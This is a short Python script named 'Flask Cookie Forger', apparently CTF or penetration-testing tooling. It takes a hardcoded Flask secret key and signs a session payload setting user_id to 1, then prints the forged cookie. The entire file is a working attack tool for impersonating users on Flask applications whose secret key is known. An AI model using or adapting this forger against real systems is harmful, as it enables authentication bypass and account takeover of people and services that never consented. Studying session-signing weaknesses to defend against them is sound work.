#forge flask cookie

#!/usr/bin/env python3
# encoding: utf-8

from hashlib import sha1
from flask.sessions import session_json_serializer
from itsdangerous import URLSafeTimedSerializer, BadTimeSignature
import base64
import zlib
from cuteprint import PrettyPrinter # Available here : https://github.com/terryvogelsang/cuteprint

PAYLOADdemo = {"_fresh":True,"_id":"a8052de1d69e8a214af2beee5f1c991fee09c31dba096fe618cc1de796a5e63163f463959cea05874f12e024cdfeb4bc26f13165e120f239805f99d5fd610a01","csrf_token":"dfd25fb8ed6b692b1a072baa742c83dc9562a782","user_id":1}

PAYLOAD = {'_fresh': True, '_id': 'd36fbb188b298013e79c8b1a7d2ab933a3f2ac5b1942b2f3a21570f7e19b870a933970d6bc44a9b38f2925390e9724e96d7273a0828ad8617fab62053c58b54a', 'csrf_token': '84de1c641c38cf8232e2513068c42efcb28053de', 'user_id': '1'}





p = PrettyPrinter()

signer = URLSafeTimedSerializer(
    'a155eb4e1743baef085ff6ecfed943f2', salt='cookie-session',
    serializer=session_json_serializer,
    signer_kwargs={'key_derivation': 'hmac', 'digest_method': sha1}
)

def forgeSession():
    gen_payload = signer.dumps(PAYLOAD)
    p.print_good("Generated signed cookie : {}".format(gen_payload))

if __name__ == '__main__':

    p.print_title("Flask Cookie Forger")

    # Forge
    p.print_separator(suffix="FORGING COOKIE", separator='=')
    t2 = p.start_progress(task="Forge Cookie with payload {} ...".format(PAYLOAD), enable_dots=False)
    forgeSession()
    p.stop_progress(t2)
